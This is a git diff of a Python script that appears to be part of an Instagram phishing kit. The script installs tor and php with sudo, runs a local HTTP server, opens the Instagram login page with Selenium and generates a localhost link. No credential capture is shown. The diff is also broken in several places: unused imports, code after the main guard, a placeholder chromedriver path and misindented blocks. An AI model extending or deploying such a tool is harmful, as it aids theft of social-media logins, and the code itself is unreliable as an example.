@@ -8,12 +8,14 @@ import re
 import subprocess
 import http.server
 import socketserver
+from webbrowser import Chrome
 from selenium import webdriver
 from selenium.webdriver.common.by import By
 from selenium.webdriver.support.ui import WebDriverWait
 from selenium.webdriver.support import expected_conditions as EC
 import getpass
-
+import math
+import time  
 
 
 def check_root():
@@ -24,20 +26,22 @@ def main():
     loading_symbols = ["/", "-", "\\", "|"]
     i = 0
     while True:
-        print(f"\rLoading{loading_symbols[i % len(loading_symbols)]}", end="")
+        print(loading_symbols[i % len(loading_symbols)] + "\r", end="")
         i += 1
-        time.sleep(10)
-        if check_root():
+        if i >= 10:
             break
-
-    if check_root():
-        print("\033[92mYOU ARE ROOTED.")
+        time.sleep(1)
+    if os.geteuid() == 0:
+        print("YOU'RE ROOTED.")
+        return 1
     else:
-        print("\033[92mYOU ARE NOT ROOTED.")
+        print("YOU'RE NOT ROOTED.")
+        return 0
+
 
 if __name__ == "__main__":
     main()
-
+    
 # Update packages and install dependencies
 subprocess.run(["sudo", "apt-get", "update"])
 subprocess.run(["sudo", "apt-get", "install", "-y", "php", "git", "curl", "python3", "ruby", "tor", "bash", "python3-pip", "xidel", "python3-selenium"])
@@ -64,7 +68,6 @@ print("\033[92m         #                                             #")
 print("\033[92m         ***********************************************")
 print("\033[92m\n\n")
 
-# Prompt user to enter a port number
 def validate_port(port):
     return re.match(r'^([1-9][0-9]{3}|[1-5][0-9]{4}|6[0-4][0-9]{3}|65[0-4][0-9]{2}|655[0-2][0-9]|6553[0-5])$', port)
 
@@ -91,12 +94,8 @@ def run_server():
             self.end_headers()
             self.wfile.write(b"Hello, this is your custom server!")
 
-    # Create the server
-    with socketserver.TCPServer(("", int(port)), MyRequestHandler) as httpd:
-        print(f"Server is running on port {port}")
-
-    # Initialize the Chrome WebDriver
-    driver = webdriver.Chrome()  # Use Chrome or Firefox: webdriver.Chrome() or webdriver.Firefox()
+    # Initialize the Chrome WebDriver (replace with actual path to chromedriver)
+    driver = webdriver.Chrome(executable_path='/path/to/chromedriver')  # Use Chrome or Firefox
 
     try:
         # Open Instagram login page
@@ -133,6 +132,10 @@ def run_server():
     finally:
         # Close the browser
         driver.quit()
+
+    # Create the server
+    with socketserver.TCPServer(("", int(port)), MyRequestHandler) as httpd:
+        print(f"Server is running on port {port}")
 
         # Generate the link
         link = f"http://localhost:{port}/"
